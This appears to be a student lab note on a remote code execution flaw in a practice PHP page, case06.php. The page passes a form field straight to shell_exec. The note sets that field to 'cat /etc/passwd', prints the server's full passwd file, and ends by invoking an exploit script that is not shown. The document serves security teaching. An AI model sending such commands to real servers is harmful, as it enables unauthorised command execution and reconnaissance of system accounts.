# Bug Categoty: Remote Code Execution
# target: cat /etc/passwd remotely
# root:x:0:0:root:/root:/bin/bash
# daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
# bin:x:2:2:bin:/bin:/usr/sbin/nologin
# sys:x:3:3:sys:/dev:/usr/sbin/nologin
# sync:x:4:65534:sync:/bin:/bin/sync
# games:x:5:60:games:/usr/games:/usr/sbin/nologin
# man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
# lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
# mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
# news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
# uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
# proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
# www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
# backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
# list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
# irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
# gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
# nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
# libuuid:x:100:101::/var/lib/libuuid:
# syslog:x:101:104::/home/syslog:/bin/false
# messagebus:x:102:106::/var/run/dbus:/bin/false
# usbmux:x:103:46:usbmux daemon,,,:/home/usbmux:/bin/false
# dnsmasq:x:104:65534:dnsmasq,,,:/var/lib/misc:/bin/false
# avahi-autoipd:x:105:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
# kernoops:x:106:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
# rtkit:x:107:114:RealtimeKit,,,:/proc:/bin/false
# saned:x:108:115::/home/saned:/bin/false
# whoopsie:x:109:116::/nonexistent:/bin/false
# speech-dispatcher:x:110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/sh
# avahi:x:111:117:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
# lightdm:x:112:118:Light Display Manager:/var/lib/lightdm:/bin/false
# colord:x:113:121:colord colour management daemon,,,:/var/lib/colord:/bin/false
# hplip:x:114:7:HPLIP system user,,,:/var/run/hplip:/bin/false
# pulse:x:115:122:PulseAudio daemon,,,:/var/run/pulse:/bin/false
# student:x:1000:1000:Student,,,:/home/student:/bin/bash
# mysql:x:116:125:MySQL Server,,,:/nonexistent:/bin/false
# vboxadd:x:999:1::/var/run/vboxadd:/bin/false
# sshd:x:117:65534::/var/run/sshd:/usr/sbin/nologin

# The logic of case06.php is:
# This is a webpage that includes a form for submitting a command to the server
# The form uses HTTP POST metod to send 'cmd_url' to the PHP script
# The PHP script assign the value of 'cmd_url' to $cmd and use shell_exec to execute the command
# Finally the output of the command is displayed on the webpage

# Exploit:
# case06 is vulnerable to Remote Code Execution attackes 
# because it allows attackers to execute arbitrary commands on the server by submitting them through 'cmd_url'
# case06 will take the value of 'cmd_url' and pass it directly to the shell_exec() function
# Then the value of 'cmd_url' will be executed as a shell command on the server.
# So we set 'cmd_url' to 'cat /etc/passwd' and the server will execute the command.

python ./case06.py
